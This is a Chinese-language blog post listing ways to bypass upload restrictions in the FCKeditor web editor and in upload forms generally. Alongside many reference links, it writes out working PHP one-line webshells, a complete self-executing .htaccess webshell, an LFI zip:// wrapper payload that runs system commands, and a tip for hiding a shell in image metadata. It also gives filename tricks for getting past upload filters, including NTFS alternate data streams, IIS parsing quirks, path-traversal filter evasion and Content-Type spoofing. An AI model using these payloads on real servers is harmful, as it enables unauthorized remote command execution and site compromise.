---
layout:     post
title:      fckeditor各版本绕过
date:       2016-08-12
summary:    fckeditor各版本绕过
categories: web
tags:
 - fckeditor
 - web
 - upload
---

### 0x00 fckeditor上传漏洞总结

    http://sec.chinabyte.com/206/13708206.shtml
    http://www.cnbraid.com/2015/07/09/fckeditor/
    http://www.it610.com/article/1842939.htm
    http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf <=2.6.4

### 0x01 asp

    <=2.6.4
        http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf
    2.6.6
        http://www.hack80.com/thread-320-1-1.html
        http://www.qhwins.com/ShowNews/?11-20109214030542523.html
    2.6.8
        http://www.freebuf.com/vuls/6408.html

### 0x02 php

    <=2.6.4
        http://secureyes.net/nw/assets/File-Upload-Vulnerability-in-FCKEditor.pdf

### 0x03 fckeditor经典尝试后缀

    1>将后缀改成.php.pjpg
    2>将后缀改成.html
    3>将后缀改成.lnk

### 0x04 其它上传技巧

    1>上传时,延迟一下再上传,有时能bypass admin,用到firefox tamper插件
        https://www.youtube.com/watch?v=ndeYnMoFPx8
        管理员登录绕过
            https://www.youtube.com/watch?v=UO-vzWFctTA
            https://www.youtube.com/watch?v=a5fm629s8Ao
                firefox noredirect插件
    2>双文件上传
    3>上传以图片后缀名为后缀的压缩文件,文件实际是一个webshell.php文件的压缩文件(zip),利用lfi漏洞并将lfi要包含
      的文件的参数赋值为:
        zip://archive.zip#webshell.php
        或
        zip://archive.zip#webshell.php&param1=system&param2=ls   ===>这里对应webshell.php为:
            <?php $_GET['param1']($_GET['param2']);?>
      这里适用的情况为:
        a>可上传任意内容文件(通过修改Content-Type等达到目的),但文件会被重命令为以png为后缀文件
        b>找到了lfi漏洞,但是lfi漏洞不能包函.|./|..|..\|...等情况
      更多细节:
        https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/
    4>上传图片被resize等修改时,绕过方法: 
        a)利用上传前和上传后的文件对比找出没有变化的字符串,将其写payload
            http://www.freebuf.com/articles/web/54086.html
        b)老外的方法,比a)中的要好
            https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/
        用法:x.php?0=system post data:1=whoami,上面链接中的payload见如下phppayload
        c)上面b中的条件限制为png且大小为32x32,jpg绕过方法
            http://www.blogs8.cn/posts/WiA3bxU

<a href="https://www.idontplaydarts.com/images/phppng.png">phppayload</a>
<a href="https://raw.githubusercontent.com/3xp10it/pic/master/phppng.png">phppayload_bak_link</a>

    5>https://www.nds.rub.de/media/attachments/files/2012/11/File-in-the-hole.pdf
        多种上传技巧:
        a)将.htaccess本身作为webshell,解析本身.htaccess作为php
            http://www.justanotherhacker.com/2011/05/htaccess-based-attacks.html
            -----------------------自解析.htaccess--------------------------------
            # Self contained .htaccess web shell - Part of the htshell project
            # Written by Wireghoul - http://www.justanotherhacker.com

            # Override default deny rule to make .htaccess file accessible over web
            <Files ~ "^\.ht">
            Order allow,deny
            Allow from all
            </Files>

            # Make .htaccess file be interpreted as php file. This occur after apache has interpreted
            # the apache directoves from the .htaccess file
            AddType application/x-httpd-php .htaccess

            ###### SHELL ###### <?php echo "\n";passthru($_GET['c']." 2>&1"); ?>###### LLEHS ######
            -----------------------自解析.htaccess--------------------------------

        b)NTFS ADS
            1."file.asp::$data"=="file.asp"
            2."/folder:$i30:$Index_allocation"=="/folder"
            3.".htaccess:.jpg" -> make empty ".htaccess"=="HTACCESS~1"
                适用于.htaccess不让上传情况下,估计一般情况下都不让上传隐藏文件,这时通过burp将文件名名改成
                .htaccess:.jpg则可上传.htaccess文件
            4.通过文件上传来创建文件夹(windows下)
                https://www.youtube.com/v/Ws2JrZG679Q?version=3&hl=en_US&rel=0&vq=hd720
                detail:将文件名通过burp改成file::$Index_Allocation或者是file:$I30:$Index_Allocation,这样就会在服务器上新建file文件夹
        c)绕过../和..\保护:
            https://www.youtube.com/v/HjS6Pob5t34?version=3&hl=en_US&rel=0&vq=hd720
            ../改成.. /(..%20/)
            ..\改成.. \(..%20\)
        d)iis:
            file.asp;.jpg以asp解析
            /folder.asp/file.txt以asp解析
        e)文件名后有被忽略字符
            "test.asp . .. ." == "test.asp" 
            "test.php<>" == "test.php"
        f)在图片文件的文件属性中添加copyright属性为:
            <?=$_GET[0]($_POST[1]);?>
            这个暂时没有找到工具,好像要用photoshop
        g)"file.p.phphp"==>"file.php" 
        h)配置有误情况下:
            "/file.jpg/index.php"会将file.jpg按照php解析
        i)常见content-type"白名单":
            image/gif
            image/jpeg
            image/pjpeg

    6.上传.user.ini文件来解析图片或隐藏webshell[除.htaccess外的方法]
        https://ha.cker.in/1097.seo
    
    8.上传绕过waf
        https://github.com/3xp10it/sectec/blob/master/%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87waf.pdf
